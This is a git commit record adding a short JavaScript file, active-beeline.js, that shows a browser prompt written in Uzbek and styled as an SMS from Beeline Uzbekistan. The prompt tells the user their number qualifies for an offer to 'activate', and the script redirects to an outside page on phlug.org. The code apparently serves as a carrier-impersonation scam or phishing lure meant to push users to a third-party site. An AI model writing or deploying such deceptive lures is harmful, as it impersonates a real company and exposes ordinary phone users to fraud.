8a76c0348f4cb30c4bea389d70f87213e04e1705
itidnewblog4 <ukpehaitid2@gmail.com>
2025-12-15 03:14:38 +0100

    Create active-beeline.js

---
+++ active-beeline.js
@@ -0,0 +1,5 @@
+var password = 'FAOL QILING'
+password=prompt('SMS: Tabriklaymiz, sizning Beeline Uzbekistan raqamingiz taklifni olish huquqiga ega. Hozir faollashtirish uchun OK tugmasini bosing','FAOL QILING');
+if (password != 'FAOL QILING') {
+location.href='https://phlug.org/beeline.html';
+}
